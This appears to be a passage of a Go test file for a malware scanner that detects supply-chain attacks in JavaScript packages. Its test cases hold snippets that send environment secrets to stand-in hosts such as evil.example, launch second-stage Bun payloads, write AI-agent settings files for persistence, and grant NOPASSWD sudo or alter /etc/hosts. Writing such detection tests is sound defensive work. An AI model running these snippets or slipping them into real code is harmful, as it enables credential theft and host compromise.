+sh.exec('bun run ./stage.mjs');
+const t = process.env.AWS_SECRET_ACCESS_KEY;
+fetch('https://evil.example/c', { body: t });`,
+			want: true,
+			crit: true,
+		},
+		// --- false positives: Bun used legitimately, no partner ---
+		{
+			// A `bun run ...` command in a COMMENT is not execution, even
+			// alongside a real fetch() partner. Anchoring the string form to
+			// an exec wrapper keeps this quiet.
+			name: "bun run in a comment + fetch is not execution",
+			content: `// deploy step: bun run ./stage.mjs
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A fully COMMENTED exec call must not count as execution even
+			// though it textually matches the exec-wrapper regex.
+			name: "commented-out execSync(bun run) + fetch is not execution",
+			content: `// cp.execSync('bun run ./stage.mjs');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A stringified example (the exec keyword itself inside a
+			// string) is documentation, not execution.
+			name: "stringified exec example + fetch is not execution",
+			content: `const usage = "cp.execSync('bun run ./stage.mjs')";
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			name:    "bun test alone",
+			content: `require('child_process').spawn('bun', ['test']);`,
+			want:    false,
+		},
+		{
+			name:    "bun run build alone",
+			content: `require('child_process').spawn('bun', ['run', 'build']);`,
+			want:    false,
+		},
+		{
+			name: "doc string mentioning bun.sh, no execution",
+			content: `// To develop locally, install Bun from bun.sh first.
+module.exports = { name: 'lib' };`,
+			want: false,
+		},
+		{
+			name:    "bun --version probe",
+			content: `require('child_process').execSync('bun --version');`,
+			want:    false,
+		},
+		{
+			name:    "setup-bun reference in JS, no payload",
+			content: `const action = 'oven-sh/setup-bun'; // CI helper name only`,
+			want:    false,
+		},
+		{
+			// `.exec` on a non-child_process object (a DB handle) is not a
+			// process launch, even with a partner present.
+			name: "db.exec is not a process launch",
+			content: `const db = require('better-sqlite3')('x.db');
+db.exec('bun run migration.js');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// "bun" as a DATA argument (not the program) is not execution.
+			name: "bun as data argument to echo is not execution",
+			content: `const cp = require('child_process');
+cp.spawn('echo', ['bun']);
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A bun COMMAND STRING passed as data to a program API (echo is
+			// the program; "bun run ..." is just an argument) is not a Bun
+			// launch -- only exec/execSync take a whole shell command string.
+			name: "bun command string as data to echo spawn is not execution",
+			content: `const cp = require('child_process');
+cp.spawn('echo', ['bun run ./stage.mjs']);
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A file that imports shelljs but runs bun via an UNRELATED
+			// .exec receiver (a DB handle) is not a shelljs launch.
+			name: "shelljs imported but db.exec runs bun string",
+			content: `const sh = require('shelljs');
+const db = require('better-sqlite3')('x.db');
+db.exec('bun run migration.js');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A user-defined helper named exec is not a child_process /
+			// execa / shelljs binding, so it does not count as execution.
+			name: "user-defined exec helper is not a process launch",
+			content: `function exec(s) { return s.length; }
+exec('bun run ./stage.mjs');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// Program-literal form via a user-defined spawn: spawn('bun') is
+			// not a real process API unless spawn is bound to child_process.
+			name: "user-defined spawn helper with 'bun' arg is not a launch",
+			content: `function spawn(p) { return p; }
+spawn('bun');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// Destructured child_process spawn IS a real launch (TP), to
+			// prove the bound path catches the program-literal form. Paired
+			// with an obfuscator-shape payload (strong partner).
+			name: "destructured child_process spawn bun + obfuscation",
+			content: `const { spawn } = require('child_process');
+while(!![]){ var _0xabc = 1; }
+spawn('bun', ['./stage.mjs']);`,
+			want: true,
+		},
+		{
+			// Accepted tradeoff (stop-rule): Bun execution + a download URL
+			// or chmod/writeFileSync that appears ONLY as a string/doc, with
+			// no strong partner, does not fire. These string-presence
+			// signals were dropped as standalone partners.
+			name: "bun run build + download URL only in a string is not a finding",
+			content: `const cp = require('child_process');
+cp.spawn('bun', ['run', 'build']);
+console.error('Install Bun from https://bun.sh/install');`,
+			want: false,
+		},
+		{
+			name: "bun exec + chmod/writeFileSync only in a doc string is not a finding",
+			content: `const cp = require('child_process');
+cp.spawn('bun', ['run', './stage.mjs']);
+const help = 'chmod after fs.writeFileSync to stage the bundle';`,
+			want: false,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			findings := analyze(t, "index.js", c.content)
+			got := hasRule(findings, RuleBunSecondStage)
+			if got != c.want {
+				t.Fatalf("JS_BUN_SECOND_STAGE_001 present = %v, want %v (findings: %+v)", got, c.want, findings)
+			}
+			if c.want && c.crit {
+				f := findRule(findings, RuleBunSecondStage)
+				if f == nil || f.Severity != types.SeverityCritical {
+					t.Errorf("expected CRITICAL, got %+v", f)
+				}
+			}
+		})
+	}
+}
+
+// TestLexicalHardening_FPReduction covers the shared lexical view: signals
+// in comments, regex literals, or example strings must not fire, while the
+// same signal in real executable code still does.
+func TestLexicalHardening_FPReduction(t *testing.T) {
+	cases := []struct {
+		name, content, rule string
+		want                bool
+	}{
+		// --- JS_CI_SECRET_HARVEST_001: secret read + sink ---
+		{
+			name:    "fetch in comment + real secret read: no harvest",
+			content: "const t = process.env.GITHUB_TOKEN;\n// fetch('https://attacker', { body: t })\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "secret read in comment + real fetch: no harvest",
+			content: "// const t = process.env.GITHUB_TOKEN\nfetch('https://attacker', { body: 'x' });\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "fetch inside a string + real secret read: no harvest",
+			content: "const usage = \"fetch('https://attacker')\";\nconst t = process.env.GITHUB_TOKEN;\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "regex literal /fetch(/ + real secret read: no harvest",
+			content: "const re = /fetch\\(/;\nconst t = process.env.GITHUB_TOKEN;\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			name:    "real fetch + real secret read: harvest fires",
+			content: "const t = process.env.GITHUB_TOKEN;\nfetch('https://attacker', { body: t });\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		{
+			name:    "template interpolation with real secret + fetch: harvest fires",
+			content: "fetch(`https://attacker/${process.env.GITHUB_TOKEN}`);\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		// --- registry host: broad partner signal (presence on masked code) ---
+		{
+			// A host only in a COMMENT no longer counts (masked).
+			name:    "registry host only in a comment + secret read: no harvest",
+			content: "const t = process.env.NPM_TOKEN;\n// exfil to registry.npmjs.org/-/npm/v1/tokens\n",
+			rule:    RuleCISecretHarvest, want: false,
+		},
+		{
+			// A host in a (non-comment) string is a broad partner: it fires
+			// with a real secret read, independent of the HTTP client used.
+			name:    "registry host in a string + secret read: harvest fires",
+			content: "const url = 'https://registry.npmjs.org/-/npm/v1/tokens';\nconst t = process.env.NPM_TOKEN;\nrequest.post(url, { body: t });\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		{
+			name:    "session host via an unmodeled client + secret read: harvest fires",
+			content: "const t = process.env.GITHUB_TOKEN;\nsuperagent.post('https://filev2.getsession.org/', t);\n",
+			rule:    RuleCISecretHarvest, want: true,
+		},
+		// --- AGENT_PERSISTENCE_001: .claude path ---
+		{
+			name:    "claude path in a comment: no persistence",
+			content: "// writes .claude/settings.json on install\nmodule.exports = {};\n",
+			rule:    RuleAgentPersistence, want: false,
+		},
+		{
+			name:    "real write of .claude/settings.json: persistence fires",
+			content: "require('fs').writeFileSync('.claude/settings.json', JSON.stringify(hook));\n",
+			rule:    RuleAgentPersistence, want: true,
+		},
+		// --- JS_OBF_001 FP: obfuscator marker in a comment ---
+		{
+			name:    "while(!![]) in a comment is not obfuscation",
+			content: "// obfuscators emit while(!![]) loops\nmodule.exports = 1;\n",
+			rule:    RuleObfuscation, want: false,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			got := hasRule(analyze(t, "index.js", c.content), c.rule)
+			if got != c.want {
+				t.Errorf("%s present = %v, want %v (findings: %+v)", c.rule, got, c.want, analyze(t, "index.js", c.content))
+			}
+		})
+	}
+}
+
+func BenchmarkComputeMetrics(b *testing.B) {
+	// A moderately large, minified-ish payload with strings, comments, and
+	// real calls, to exercise the single shared lexical pass.
+	var sb strings.Builder
+	sb.WriteString("const cp=require('child_process');\n")
+	for i := 0; i < 2000; i++ {
+		sb.WriteString("// comment line with fetch('https://x') and process.env.TOKEN example\n")
+		sb.WriteString("const _0xabc")
+		sb.WriteString("=function(a,b){return a+b};\n")
+		sb.WriteString("doThing('some string with registry.npmjs.org inside');\n")
+	}
+	sb.WriteString("fetch('https://attacker/'+process.env.GITHUB_TOKEN);\n")
+	content := []byte(sb.String())
+	b.ReportAllocs()
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		_ = computeMetrics(content)
+	}
+}
+
+// TestObfHexCount_NotSuppressedByStringExamples locks the obfuscator-cap
+// fix: real code hex identifiers must be counted even when preceded by
+// many stringified _0x examples (which are filtered out as data).
+func TestObfHexCount_NotSuppressedByStringExamples(t *testing.T) {
+	var sb strings.Builder
+	sb.WriteString("const examples = [")
+	for i := 0; i < 150; i++ { // 150 stringified examples: must NOT count
+		sb.WriteString("'_0xa1b2c3',")
+	}
+	sb.WriteString("];\n")
+	for i := 0; i < 120; i++ { // 120 real code identifiers: must count
+		fmt.Fprintf(&sb, "var _0x%04x = %d;\n", i, i)
+	}
+	m := computeMetrics([]byte(sb.String()))
+	if m.HexIdentifierCount <= hexIdentifierThreshold {
+		t.Errorf("HexIdentifierCount = %d, want > %d (real code idents counted past string examples)", m.HexIdentifierCount, hexIdentifierThreshold)
+	}
+}
+
+// TestGitHubC2 covers JS_GITHUB_C2_001: GitHub used as a write/control
+// channel plus a strong partner. A legitimate release bot
+// (createCommitOnBranch / createOrUpdateFileContents + GITHUB_TOKEN +
+// content body) must NOT fire; only a partner that legit GitHub-write
+// tooling lacks (obfuscation, execution, persistence, non-GitHub secret,
+// exfil) triggers it.
+func TestGitHubC2(t *testing.T) {
+	cases := []struct {
+		name, content string
+		want, crit    bool
+	}{
+		{
+			name: "graphql createCommitOnBranch + obfuscation",
+			content: "while(!![]){ var _0xa = 1; }\n" +
+				"const q = `mutation { createCommitOnBranch(input:{}) { commit { url } } }`;\n" +
+				"fetch('https://api.github.com/graphql', { method: 'POST', body: q });\n",
+			want: true,
+		},
+		{
+			name:    "graphql createGist + NPM_TOKEN -> CRITICAL",
+			content: "const t = process.env.NPM_TOKEN;\nconst q = 'mutation { createGist(input:{}) { url } }';\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 14 #1: octokit.graphql() send form (no literal
+			// api.github.com/graphql endpoint string).
+			name: "octokit.graphql createCommitOnBranch + obfuscation",
+			content: "while(!![]){ var _0xb = 1; }\n" +
+				"await octokit.graphql(`mutation { createCommitOnBranch(input:{}) { commit { url } } }`);\n",
+			want: true,
+		},
+		{
+			name:    "REST /git/blobs POST + Bun execution",
+			content: "require('child_process').spawn('bun', ['./stage.mjs']);\nfetch('https://api.github.com/repos/o/r/git/blobs', { method: 'POST', body });\n",
+			want:    true,
+		},
+		{
+			// url: option form: axios({ url, method }) with the endpoint as
+			// the url-keyed value.
+			name:    "axios url-option PUT /contents + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\naxios({ method: 'put', url: 'https://api.github.com/repos/o/r/contents/f', data });\n",
+			want:    true,
+		},
+		{
+			// codex round 11 #2: a verb-specific helper (axios.post / got.put)
+			// is itself the write, with no method: option to find.
+			name:    "axios.post /git/blobs + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\nawait axios.post('https://api.github.com/repos/o/r/git/blobs', payload);\n",
+			want:    true,
+		},
+		{
+			// codex round 12 #2: a verb-specific client with a url-OPTION
+			// form (request.post({ url, body })) is a write even though there
+			// is no method: field -- the .post callee is the verb.
+			name:    "request.post url-option /git/blobs + AWS secret -> CRITICAL",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nrequest.post({ url: 'https://api.github.com/repos/o/r/git/blobs', body: k });\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "octokit git.updateRef + .claude persistence",
+			content: "require('fs').writeFileSync('.claude/settings.json', hook);\nawait octokit.git.updateRef({ owner, repo, ref, sha });\n",
+			want:    true,
+		},
+		{
+			name:    "octokit createBlob + AWS secret + non-github fetch -> CRITICAL",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nawait octokit.git.createBlob({ owner, repo, content: k });\nfetch('https://evil.example/c', { method: 'POST', body: k });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 1 #3: destructured non-GitHub secret must count.
+			name:    "destructured AWS secret + github write -> CRITICAL",
+			content: "const { AWS_SECRET_ACCESS_KEY } = process.env;\nawait octokit.git.createBlob({ owner, repo, content: AWS_SECRET_ACCESS_KEY });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 2 #2: destructure with a default initializer.
+			name:    "destructured AWS secret with default + github write -> CRITICAL",
+			content: "const { AWS_SECRET_ACCESS_KEY = '' } = process.env;\nawait octokit.git.createBlob({ owner, repo, content: AWS_SECRET_ACCESS_KEY });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 2 #3: octokit.request('POST /...') route form.
+			name:    "octokit.request POST git/blobs route + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\nawait octokit.request('POST /repos/{owner}/{repo}/git/blobs', { owner, repo, content });\n",
+			want:    true,
+		},
+		{
+			// codex round 6: an early doc-string mention of the mutation
+			// name (no `mutation` keyword) must not suppress a later real
+			// mutation body. (Partner is Bun execution, not bare
+			// child_process -- see round 12.)
+			name: "doc mention of createGist then real mutation + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\n" +
+				"const help = 'see createGist docs';\n" +
+				"const q = 'mutation { createGist(input:{}) { url } }';\n" +
+				"fetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
+			want: true,
+		},
+		{
+			// codex round 4 #2: a read of /contents (for a SHA) followed by
+			// a later write endpoint must still be detected.
+			name: "github contents READ then later contents WRITE + Bun",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\n" +
+				"const cur = await fetch('https://api.github.com/repos/o/r/contents/f');\n" +
+				"await fetch('https://api.github.com/repos/o/r/contents/f', { method: 'PUT', body });\n",
+			want: true,
+		},
+		// --- false positives: legitimate GitHub-write tooling ---
+		{
+			// codex round 2 #1: an env ASSIGNMENT (write) is not a read.
+			name:    "env assignment to NPM_TOKEN + github write is not a secret read",
+			content: "process.env.NPM_TOKEN = computeToken();\nawait octokit.git.createBlob({ owner, repo, content });\n",
+			want:    false,
+		},
+		{
+			// codex round 3 #1: a github mutation NAME in a doc string with
+			// no GraphQL `mutation` keyword is not a channel.
+			name:    "createGist mentioned in a doc string + child_process is not a channel",
+			content: "const help = 'call createGist to publish a snippet';\nrequire('child_process').execSync('build');\n",
+			want:    false,
+		},
+		{
+			// codex round 3 #2: a non-GitHub route that merely contains
+			// /git/blobs (no /repos/o/r/ GitHub prefix) is not a channel.
+			name:    "non-github /git/blobs route + POST + secret is not a channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://metrics.example/api/git/blobs', { method: 'POST', body: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 4 #3: a generic .createBlob on a non-octokit
+			// receiver (a DB handle) is not a GitHub write.
+			name:    "db.createBlob + AWS secret is not a github channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\ndb.createBlob({ data: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 4 #1: a route string in config, never passed to a
+			// request call, is not a write channel.
+			name:    "route string in config (no request call) + secret is not a channel",
+			content: "const route = 'POST /repos/o/r/git/blobs';\nconst k = process.env.AWS_SECRET_ACCESS_KEY;\nlog(route);\n",
+			want:    false,
+		},
+		{
+			// codex round 5 #2: a receiver merely starting with "gh"
+			// (ghost) is not an Octokit receiver.
+			name:    "ghost.createBlob + AWS secret is not a github channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nghost.createBlob({ data: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 5 #1: a stringified request example is not a real
+			// request call.
+			name:    "stringified request route example + secret is not a channel",
+			content: "const doc = \"octokit.request('POST /repos/o/r/git/blobs')\";\nconst k = process.env.AWS_SECRET_ACCESS_KEY;\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #1: a local helper named createGist (code, not a
+			// GraphQL query string) is not a GitHub channel.
+			name:    "local helper named createGist + child_process is not a channel",
+			content: "function createGist(x) { return x; }\ncreateGist(1);\nrequire('child_process').execSync('build');\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #2: a GET of /contents + an unrelated distant
+			// POST is not a GitHub write.
+			name: "github contents READ + unrelated distant POST is not a write",
+			content: "const u = 'https://api.github.com/repos/o/r/contents/file';\nfetch(u);\n" +
+				strings.Repeat("const filler = 1; // push the POST out of the endpoint window\n", 12) +
+				"const k = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://metrics.example/m', { method: 'POST', body: k });\n",
+			want: false,
+		},
+		{
+			name:    "release bot createCommitOnBranch + GITHUB_TOKEN + body only",
+			content: "const t = process.env.GITHUB_TOKEN;\nconst q = `mutation { createCommitOnBranch(input:{ branch, message, fileChanges }) }`;\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
+			want:    false,
+		},
+		{
+			name:    "release bot createOrUpdateFileContents shape",
+			content: "const token = process.env.GITHUB_TOKEN;\nawait octokit.repos.createOrUpdateFileContents({ owner, repo, path, message:'rel', content: b64, sha });\n",
+			want:    false,
+		},
+		{
+			// codex round 12 #1: a release bot routinely shells out for git
+			// metadata. Bare child_process is NOT a partner release bots
+			// lack, so execSync('git ...') + octokit write + GITHUB_TOKEN
+			// must not fire.
+			name: "release bot: git shell + octokit write + GITHUB_TOKEN is not C2",
+			content: "const token = process.env.GITHUB_TOKEN;\n" +
+				"const sha = require('child_process').execSync('git rev-parse HEAD').toString();\n" +
+				"await octokit.repos.createOrUpdateFileContents({ owner, repo, path, message:'rel', content: b64, sha });\n",
+			want: false,
+		},
+		{
+			name:    "graphql query only (no mutation)",
+			content: "const q = `query { repository(owner:$o, name:$n) { id } }`;\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\nconst t = process.env.AWS_SECRET_ACCESS_KEY;\n",
+			want:    false,
+		},
+		{
+			// codex round 14 #1: a mutation FIXTURE string with no send to
+			// GitHub's GraphQL API (no endpoint, no .graphql() call) is not a
+			// channel, even with a non-GitHub secret present.
+			name:    "graphql mutation fixture string (no send) + AWS secret is not a channel",
+			content: "const example = 'mutation { createGist(input:{}) { url } }';\nconst k = process.env.AWS_SECRET_ACCESS_KEY;\nexport default example;\n",
+			want:    false,
+		},
+		{
+			// codex round 15: even when the file also NAMES the graphql
+			// endpoint as an unused constant, with no client call sending the
+			// mutation, it is not a channel.
+			name: "graphql endpoint + mutation as unused constants (no send) is not a channel",
+			content: "const endpoint = 'https://api.github.com/graphql';\n" +
+				"const q = 'mutation { createCommitOnBranch(input:{}) { commit { url } } }';\n" +
+				"const k = process.env.AWS_SECRET_ACCESS_KEY;\nexport { endpoint, q };\n",
+			want: false,
+		},
+		{
+			// codex round 14 #2: the github path is a url-keyed value inside
+			// the request BODY (second arg), the POST targets the collector.
+			name:    "github url-key inside POST body to collector is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\naxios.post('https://collector.example', { url: 'https://api.github.com/repos/o/r/git/blobs', token: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 17: a non-GitHub host that uses a GitHub-shaped
+			// /repos/.../contents path is not a GitHub write -- the REST
+			// endpoint requires the api.github.com host.
+			name:    "non-github host with github-shaped /contents path + POST is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://internal.example/repos/o/r/contents/f', { method: 'POST', body: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 18 #2: an Octokit write method name on a non-GitHub
+			// receiver (api.createForAuthenticatedUser) is not a channel --
+			// the write methods require an octokit/github/gh receiver chain.
+			name:    "createForAuthenticatedUser on non-github receiver + AWS secret is not a channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\napi.createForAuthenticatedUser({ data: k });\n",
+			want:    false,
+		},
+		{
+			name:    "release/repo listing, no write",
+			content: "const t = process.env.AWS_SECRET_ACCESS_KEY;\nawait octokit.repos.listReleases({ owner, repo });\nfetch('https://api.github.com/repos/o/r/releases');\n",
+			want:    false,
+		},
+		{
+			name:    "token + api.github.com read, no write/control",
+			content: "const t = process.env.GITHUB_TOKEN;\nfetch('https://api.github.com/repos/o/r', { headers: { Authorization: 'Bearer ' + t } });\n",
+			want:    false,
+		},
+		{
+			name:    "React.createRef + child_process is not a github channel",
+			content: "import React from 'react';\nconst ref = React.createRef();\nrequire('child_process').execSync('build');\n",
+			want:    false,
+		},
+		{
+			name:    "github write mutation only in a comment",
+			content: "// uses octokit.git.createBlob and createCommitOnBranch under the hood\nrequire('child_process').execSync('x');\n",
+			want:    false,
+		},
+		{
+			// codex round 7 #1: a whole-process env dump is a strong
+			// (non-GitHub) secret read, so it is the credential-exfil-via
+			// -GitHub shape -> CRITICAL.
+			name:    "JSON.stringify(process.env) + github write -> CRITICAL",
+			content: "await octokit.git.createBlob({ owner, repo, content: JSON.stringify(process.env) });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 7 #2: a variable that merely stores a mutation
+			// NAME (`mutationName`) is not a GraphQL mutation body; the
+			// `mutation` substring lives in an identifier, not the string.
+			name:    "const mutationName = 'createGist' + child_process is not a channel",
+			content: "const mutationName = 'createGist';\nrequire('child_process').execSync('build');\nlog(mutationName);\n",
+			want:    false,
+		},
+		{
+			// codex round 8: a read-only GitHub /contents fetch plus an
+			// unrelated POST to a DIFFERENT host is not a github write -- the
+			// method must be in the same request as the github endpoint.
+			name: "github contents READ + POST to different host is not a write",
+			content: "const cur = await fetch('https://api.github.com/repos/o/r/contents/f');\n" +
+				"const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"await fetch('https://evil.example/m', { method: 'POST', body: k });\n",
+			want: false,
+		},
+		{
+			// codex round 9: the GitHub path is a body VALUE (data), the POST
+			// targets a collector. The endpoint must be the request URL, not
+			// a string sitting in the request body.
+			name: "github path as POST body to collector is not a write channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"fetch('https://collector.example', { method: 'POST', body: 'https://api.github.com/repos/o/r/git/blobs' });\n",
+			want: false,
+		},
+		{
+			// codex round 10 #1: a single dynamic key read process.env[k]
+			// (resolving to GITHUB_TOKEN) is the release-bot shape, not a
+			// whole-env dump -- not a strong non-GitHub secret partner.
+			name: "github write + dynamic process.env[k] read is not a strong secret",
+			content: "const name = 'GITHUB_TOKEN';\nconst t = process.env[name];\n" +
+				"await octokit.git.createBlob({ owner, repo, content, headers: { authorization: t } });\n",
+			want: false,
+		},
+		{
+			// codex round 10 #2: a `method` field nested in the request body
+			// (not the top-level options object) on a read-only GitHub URL is
+			// not the HTTP verb.
+			name: "read-only github URL with nested body.method is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"fetch('https://api.github.com/repos/o/r/contents/f', { body: { method: 'POST' } });\n",
+			want: false,
+		},
+		{
+			// codex round 11 #1: a github URL passed as the first arg of a
+			// non-HTTP callee (console.log) is not a request, even with a
+			// method-shaped object alongside it.
+			name: "console.log of github URL + method-shaped object is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"console.log('https://api.github.com/repos/o/r/git/blobs', { method: 'POST' });\n",
+			want: false,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			findings := analyze(t, "index.js", c.content)
+			got := hasRule(findings, RuleGitHubC2)
+			if got != c.want {
+				t.Fatalf("JS_GITHUB_C2_001 present = %v, want %v (findings: %+v)", got, c.want, findings)
+			}
+			if c.want && c.crit {
+				f := findRule(findings, RuleGitHubC2)
+				if f == nil || f.Severity != types.SeverityCritical {
+					t.Errorf("expected CRITICAL, got %+v", f)
+				}
+			}
+		})
+	}
+}
+
+func TestHostTamper(t *testing.T) {
+	cases := []struct {
+		name, content string
+		rule          string // expected rule ID, "" = neither tamper rule should fire
+		crit          bool
+	}{
+		// --- JS_SUDOERS_TAMPER_001 true positives ---
+		{
+			name:    "fs appendFile to sudoers.d with NOPASSWD grant -> CRITICAL",
+			content: "const fs = require('fs');\nfs.appendFileSync('/etc/sudoers.d/miasma', 'user ALL=(ALL) NOPASSWD:ALL');\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			name:    "shell tee to sudoers.d with grant content -> CRITICAL",
+			content: "require('child_process').execSync(\"echo 'u ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/x\");\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			name:    "shell append to sudoers, no grant, no partner -> HIGH",
+			content: "require('child_process').execSync('echo somecfg >> /etc/sudoers.d/x');\n",
+			rule:    RuleSudoersTamper, crit: false,
+		},
+		{
+			name:    "fs write to sudoers, no grant, + Bun partner -> CRITICAL",
+			content: "const fs = require('fs');\nrequire('child_process').spawn('bun', ['./s.mjs']);\nfs.writeFileSync('/etc/sudoers.d/x', cfg);\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		// --- JS_HOST_TRUST_TAMPER_001 true positives ---
+		{
+			name:    "fs write to ld.so.preload standalone -> HIGH",
+			content: "const fs = require('fs');\nfs.writeFileSync('/etc/ld.so.preload', '/tmp/libx.so');\n",
+			rule:    RuleHostTrustTamper, crit: false,
+		},
+		{
+			name:    "fs append to /etc/hosts with sensitive domain -> HIGH",
+			content: "const fs = require('fs');\nfs.appendFileSync('/etc/hosts', '1.2.3.4 api.github.com');\n",
+			rule:    RuleHostTrustTamper, crit: false,
+		},
+		{
+			name:    "shelljs sed -i resolv.conf + AWS secret -> CRITICAL",
+			content: "const sh = require('shelljs');\nconst k = process.env.AWS_SECRET_ACCESS_KEY;\nsh.exec(\"sed -i 's/a/b/' /etc/resolv.conf\");\n",
+			rule:    RuleHostTrustTamper, crit: true,
+		},
+		{
+			name:    "fs write to sshd_config standalone -> HIGH",
+			content: "const fs = require('fs');\nfs.writeFileSync('/etc/ssh/sshd_config', cfg);\n",
+			rule:    RuleHostTrustTamper, crit: false,
+		},
+		// --- false positives ---
+		{
+			name:    "sudoers mentioned only in a comment",
+			content: "// writes /etc/sudoers.d/x with NOPASSWD\nconst x = 1;\n",
+			rule:    "",
+		},
+		{
+			name:    "doc string of fs.writeFileSync to sudoers (no real call)",
+			content: "const doc = \"fs.writeFileSync('/etc/sudoers', x)\";\nconsole.log(doc);\n",
+			rule:    "",
+		},
+		{
+			name:    "visudo -c validation only is not a write",
+			content: "require('child_process').execSync('visudo -c /etc/sudoers');\n",
+			rule:    "",
+		},
+		{
+			name:    "chmod 440 sudoers.d without a write",
+			content: "require('child_process').execSync('chmod 440 /etc/sudoers.d/x');\n",
+			rule:    "",
+		},
+		{
+			name:    "sudo apt-get install is not host tampering",
+			content: "require('child_process').execSync('sudo apt-get install -y curl');\n",
+			rule:    "",
+		},
+		{
+			name:    "fs.readFileSync /etc/hosts is a read, not a write",
+			content: "const fs = require('fs');\nconst h = fs.readFileSync('/etc/hosts', 'utf8');\n",
+			rule:    "",
+		},
+		{
+			name:    "local wrapper writeFileSync to sudoers not bound to fs",
+			content: "const writer = makeWriter();\nwriter.writeFileSync('/etc/sudoers', x);\n",
+			rule:    "",
+		},
+		{
+			name:    "db.exec redirect to sudoers not child_process/shelljs",
+			content: "const db = getDb();\ndb.exec(\"echo x >> /etc/sudoers\");\n",
+			rule:    "",
+		},
+		{
+			name:    "fs append to /etc/hosts without sensitive domain or partner",
+			content: "const fs = require('fs');\nfs.appendFileSync('/etc/hosts', '127.0.0.1 localdev');\n",
+			rule:    "",
+		},
+		{
+			// codex round 1 #1: execFileSync is a program API (no shell), so a
+			// redirect-looking string in its argv is a literal argument, not a
+			// write to sudoers.
+			name:    "execFileSync with redirect-looking arg is not a shell write",
+			content: "const cp = require('child_process');\ncp.execFileSync('echo', ['x ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers.d/x']);\n",
+			rule:    "",
+		},
+		{
+			// codex round 1 #2: a prefix-sharing path (/etc/sudoers.bak) is a
+			// different file and must not match the /etc/sudoers token.
+			name:    "fs write to /etc/sudoers.bak is not the sudoers file",
+			content: "const fs = require('fs');\nfs.writeFileSync('/etc/sudoers.bak', 'backup');\n",
+			rule:    "",
+		},
+		{
+			// codex round 1 #2: /etc/hosts.allow is not /etc/hosts.
+			name:    "fs write to /etc/hosts.allow is not the hosts file",
+			content: "const fs = require('fs');\nfs.writeFileSync('/etc/hosts.allow', 'ALL: 10.0.0.0/8');\n",
+			rule:    "",
+		},
+		{
+			// codex round 2 #2: a destructured-RENAMED execSync still reports
+			// its source method, so a real shell write is not missed.
+			name:    "destructured renamed execSync shell write to sudoers -> CRITICAL",
+			content: "const { execSync: run } = require('child_process');\nrun(\"echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x\");\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			// codex round 2 #1: only the first (command) argument is shell-
+			// interpreted; a redirect-looking string in the options/env object
+			// is not a write.
+			name:    "execSync redirect-looking string in options env is not a write",
+			content: "const cp = require('child_process');\ncp.execSync('true', { env: { NOTE: 'x >> /etc/sudoers.d/x' } });\n",
+			rule:    "",
+		},
+		{
